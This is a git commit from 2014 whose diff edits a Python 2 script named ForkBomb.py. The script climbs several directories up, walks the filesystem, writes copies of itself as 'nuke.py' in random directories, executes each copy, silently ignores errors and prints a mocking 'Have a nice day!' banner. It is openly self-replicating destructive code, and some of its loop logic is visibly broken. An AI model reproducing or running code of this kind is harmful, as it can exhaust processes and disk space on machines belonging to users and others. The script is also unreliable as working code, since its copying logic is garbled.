d5ce74b7f4c511f6cec2523bd961f75a0001b558
Tyler Robbins <tyler@familyrobbins.com>
2014-02-19 10:02:45 -0800

    Changed some stuff. Can't remember what it is.

--- ForkBomb.py
+++ ForkBomb.py
@@ -1,38 +1,31 @@
 import os
 import platform
 import random
-
 main = open("ForkBomb.py", 'rb')
-
 if str(platform.system()) == 'Windows':
 	slash = "\\"
-
 else:
 	slash = "//"
-
-for item in os.getcwd().split(slash)[:len(str(os.getcwd()).split(slash)) - (len(str(os.getcwd()).split(slash)) - 5)]: #changes to 4 directories above the root
+for item in os.getcwd().split(slash)[:len(str(os.getcwd()).split(slash)) - (len(str(os.getcwd()).split(slash)) - 5)]:
 	print item
 	os.chdir(".." + slash)
-
-for root, dirs in os.walk(os.getcwd()):
+for dirs in os.walk(os.getcwd()):
 	try:
 		x = random.randint(1,2)
-
 		if x == 1:
 			fork = open("nuke.py", 'wb')
-			for line in main and i < 36:
+			i = 0
+			for line in main and i < 29:
 				i += 1
 				fork.write(main.readline())
 				fork.close()
-
 			if str(platform.system()) == 'Windows':
 				os.system("nuke.py")
 			else:
 				os.system("python nuke.py")
-	except Exception as e:
-		print e
-
-	print u'\u2622 \u263A' + "Have a nice day!" + u'\u263A \u2622'
+	except Exception:
+		pass
+	print u'\u2622 \u263AHave a nice day!\u263A \u2622'
 
 for item in os.walk(os.getcwd()):
 	if item == 'nuke.py':
